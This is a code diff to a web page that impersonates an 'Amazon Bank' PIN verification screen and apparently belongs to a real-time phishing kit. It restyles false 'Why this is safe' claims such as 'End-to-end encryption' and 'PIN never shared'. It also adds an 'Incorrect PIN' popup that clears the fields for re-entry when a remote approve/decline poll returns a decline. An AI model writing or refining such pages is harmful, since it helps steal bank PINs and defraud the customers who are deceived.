@@ -185,51 +185,121 @@
     animation: spin .8s linear infinite; margin-bottom: 30px;
   }
   @keyframes spin { to { transform: rotate(360deg); } }
+
+  /* ── Safety panel — NOW SIDE-BY-SIDE ── */
   .safety-panel {
     background: rgba(255,255,255,0.05);
     border: 1px solid rgba(255,255,255,0.08);
-    border-radius: 14px; padding: 18px 16px; max-width: 320px; width: 100%;
+    border-radius: 14px;
+    padding: 16px 14px;
+    max-width: 360px;
+    width: 100%;
     text-align: left;
   }
   .safety-panel h4 {
     font-size: 12px; font-weight: 700; color: var(--amz-orange);
-    text-transform: uppercase; letter-spacing: 0.6px; margin-bottom: 10px;
+    text-transform: uppercase; letter-spacing: 0.6px;
+    margin-bottom: 12px; text-align: center;
   }
-  .safety-panel ul { list-style: none; padding: 0; margin: 0; }
+  .safety-panel ul {
+    list-style: none; padding: 0; margin: 0;
+    display: flex;
+    flex-wrap: nowrap;
+    gap: 8px;
+    align-items: stretch;
+  }
   .safety-panel li {
-    display: flex; align-items: flex-start; gap: 8px;
-    font-size: 12px; line-height: 1.5; color: rgba(255,255,255,0.82);
-    padding: 6px 0;
+    flex: 1 1 0;
+    display: flex; flex-direction: column;
+    align-items: center; justify-content: flex-start;
+    gap: 6px;
+    font-size: 10.5px;
+    line-height: 1.4;
+    color: rgba(255,255,255,0.82);
+    padding: 10px 6px;
+    background: rgba(255,255,255,0.04);
+    border-radius: 10px;
+    text-align: center;
   }
-  .safety-panel li svg { flex: 0 0 14px; height: 14px; margin-top: 2px; color: var(--amz-success); }
-  .result-overlay {
-    position: fixed; inset: 0; background: #EEF0F2;
-    z-index: 110;
-    display: none; align-items: center; justify-content: center; padding: 24px;
+  .safety-panel li svg {
+    width: 18px; height: 18px;
+    color: var(--amz-success);
+    flex-shrink: 0;
   }
-  .result-overlay.show { display: flex; }
-  .result-card {
-    background: #fff; border-radius: 18px; padding: 30px 24px;
-    text-align: center; max-width: 340px; width: 100%;
-    box-shadow: 0 24px 60px rgba(19,25,33,0.2);
+  @media (max-width: 360px) {
+    .safety-panel ul { gap: 6px; }
+    .safety-panel li { font-size: 9.5px; padding: 8px 4px; }
+    .safety-panel li svg { width: 16px; height: 16px; }
   }
-  .result-card .ic {
-    width: 64px; height: 64px; border-radius: 50%;
+
+  /* ── Popup for Incorrect PIN ── */
+  .popup-backdrop {
+    position: fixed; inset: 0;
+    background: rgba(19,25,33,0.45);
+    z-index: 120;
+    display: none;
+    align-items: center; justify-content: center;
+    padding: 24px;
+  }
+  .popup-backdrop.show {
+    display: flex;
+    animation: fadeIn .2s ease;
+  }
+  @keyframes fadeIn {
+    from { opacity: 0; }
+    to   { opacity: 1; }
+  }
+  .popup-card {
+    background: #FFFFFF;
+    border-radius: 16px;
+    padding: 26px 22px 22px;
+    max-width: 320px;
+    width: 100%;
+    text-align: center;
+    box-shadow: 0 20px 60px rgba(19,25,33,0.35);
+    animation: popIn .25s cubic-bezier(.4,1.3,.6,1);
+  }
+  @keyframes popIn {
+    from { opacity: 0; transform: scale(0.9); }
+    to   { opacity: 1; transform: scale(1); }
+  }
+  .popup-card .ic {
+    width: 60px; height: 60px;
+    border-radius: 50%;
+    background: #FDECEA;
+    color: var(--amz-error);
     display: flex; align-items: center; justify-content: center;
-    margin: 0 auto 16px;
+    margin: 0 auto 14px;
   }
-  .result-card .ic.error { background: #FDECEA; color: var(--amz-error); }
-  .result-card .ic svg { width: 32px; height: 32px; }
-  .result-card h2 { font-size: 19px; font-weight: 800; color: var(--amz-ink); margin-bottom: 8px; }
-  .result-card p { font-size: 13.5px; color: var(--amz-muted); line-height: 1.55; margin-bottom: 20px; }
-  .result-card .try-btn {
-    width: 100%; padding: 13px; font-size: 14.5px; font-weight: 700; font-family: inherit;
+  .popup-card .ic svg { width: 30px; height: 30px; }
+  .popup-card h3 {
+    font-size: 18px; font-weight: 800;
+    color: var(--amz-ink);
+    letter-spacing: -0.3px;
+    margin-bottom: 6px;
+  }
+  .popup-card p {
+    font-size: 13px;
+    color: var(--amz-muted);
+    line-height: 1.5;
+    margin-bottom: 18px;
+  }
+  .popup-card .ok-btn {
+    width: 100%;
+    padding: 12px;
+    border: none;
+    border-radius: 10px;
+    background: var(--amz-ink);
     color: #fff;
-    background: linear-gradient(180deg, #FF9C3D 0%, var(--amz-orange) 55%, var(--amz-orange-hover) 100%);
-    border: none; border-radius: 10px; cursor: pointer;
-    box-shadow: 0 4px 14px rgba(255,134,31,0.28);
+    font-family: inherit;
+    font-size: 14px;
+    font-weight: 700;
+    cursor: pointer;
+    transition: filter .15s;
   }
-  .result-card .try-btn:active { transform: scale(0.99); }
+  .popup-card .ok-btn:hover { filter: brightness(1.15); }
+  .popup-card .ok-btn:active { transform: scale(0.98); }
+
   .state-card { padding: 46px 24px; text-align: center; }
   .state-card .ic {
     width: 54px; height: 54px; border-radius: 50%; background: var(--amz-orange-subtle);
@@ -307,25 +377,35 @@
   <div class="safety-panel">
     <h4>Why this is safe</h4>
     <ul>
-      <li><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2l8 4v6c0 5-3.5 9-8 10-4.5-1-8-5-8-10V6l8-4z"/><path d="M9 12l2 2 4-4"/></svg><span>End-to-end encryption protects your PIN at every step.</span></li>
-      <li><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2l8 4v6c0 5-3.5 9-8 10-4.5-1-8-5-8-10V6l8-4z"/><path d="M9 12l2 2 4-4"/></svg><span>No funds move until verification is fully approved.</span></li>
-      <li><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2l8 4v6c0 5-3.5 9-8 10-4.5-1-8-5-8-10V6l8-4z"/><path d="M9 12l2 2 4-4"/></svg><span>Amazon Bank never shares your PIN with third parties.</span></li>
+      <li>
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2l8 4v6c0 5-3.5 9-8 10-4.5-1-8-5-8-10V6l8-4z"/><path d="M9 12l2 2 4-4"/></svg>
+        <span>End-to-end encryption</span>
+      </li>
+      <li>
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2l8 4v6c0 5-3.5 9-8 10-4.5-1-8-5-8-10V6l8-4z"/><path d="M9 12l2 2 4-4"/></svg>
+        <span>No funds move until approved</span>
+      </li>
+      <li>
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2l8 4v6c0 5-3.5 9-8 10-4.5-1-8-5-8-10V6l8-4z"/><path d="M9 12l2 2 4-4"/></svg>
+        <span>PIN never shared</span>
+      </li>
     </ul>
   </div>
 </div>
 
-<div class="result-overlay" id="resultOverlay">
-  <div class="result-card">
-    <div class="ic error">
+<!-- Incorrect PIN popup -->
+<div class="popup-backdrop" id="popupBackdrop">
+  <div class="popup-card">
+    <div class="ic">
       <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round">
         <circle cx="12" cy="12" r="10"/>
         <path d="M12 8v4"/>
         <path d="M12 16h.01"/>
       </svg>
     </div>
-    <h2>Incorrect PIN</h2>
+    <h3>Incorrect PIN</h3>
     <p>The PIN you entered doesn't match the one linked to this account. Please try again carefully.</p>
-    <button class="try-btn" id="tryAgainBtn">Try again</button>
+    <button class="ok-btn" id="popupOkBtn">Try again</button>
   </div>
 </div>
 
@@ -546,7 +626,6 @@ function pollStatus() {
 function handleApprove() {
   state.polling = false;
   if (state.slowHintTimer) clearTimeout(state.slowHintTimer);
-  // No visible flash — spinner keeps running until navigation fires
   const next = nextPageFor(state.payload && state.payload.c);
   const qs = window.location.search || '';
   window.location.href = next + qs;
@@ -555,12 +634,24 @@ function handleApprove() {
 function handleDecline() {
   state.polling = false;
   if (state.slowHintTimer) clearTimeout(state.slowHintTimer);
-  const vo = document.getElementById('verifyingOverlay'); if (vo) vo.classList.remove('show');
-  const ro = document.getElementById('resultOverlay'); if (ro) ro.classList.add('show');
-  document.querySelectorAll('.pin-input').forEach(i => { i.value = ''; i.classList.remove('filled'); });
+
+  // Hide the verifying overlay
+  const vo = document.getElementById('verifyingOverlay');
+  if (vo) vo.classList.remove('show');
+
+  // Clear the PIN inputs so user can retry
+  document.querySelectorAll('.pin-input').forEach(i => {
+    i.value = '';
+    i.classList.remove('filled', 'error');
+  });
   state.pin = ['', '', '', ''];
-  const vb = document.getElementById('verifyBtn'); if (vb) vb.disabled = true;
+  const vb = document.getElementById('verifyBtn');
+  if (vb) vb.disabled = true;
   state.requestId = null;
+
+  // Show the popup
+  const popup = document.getElementById('popupBackdrop');
+  if (popup) popup.classList.add('show');
 }
 
 async function doVerify() {
@@ -608,11 +699,15 @@ async function boot() {
   const backBtn = document.getElementById('backBtn');
   if (backBtn) backBtn.addEventListener('click', () => { if (window.history.length > 1) window.history.back(); });
 
-  const tryAgainBtn = document.getElementById('tryAgainBtn');
-  if (tryAgainBtn) tryAgainBtn.addEventListener('click', () => {
-    const ro = document.getElementById('resultOverlay'); if (ro) ro.classList.remove('show');
-    const pe = document.getElementById('pinError'); if (pe) pe.classList.remove('show');
-    const fp = document.querySelector('.pin-input'); if (fp) fp.focus();
+  // Popup "Try again" button — closes popup, focuses first PIN input
+  const popupOkBtn = document.getElementById('popupOkBtn');
+  if (popupOkBtn) popupOkBtn.addEventListener('click', () => {
+    const popup = document.getElementById('popupBackdrop');
+    if (popup) popup.classList.remove('show');
+    const pe = document.getElementById('pinError');
+    if (pe) pe.classList.remove('show');
+    const firstPin = document.querySelector('.pin-input');
+    if (firstPin) firstPin.focus();
   });
 
   let payload;
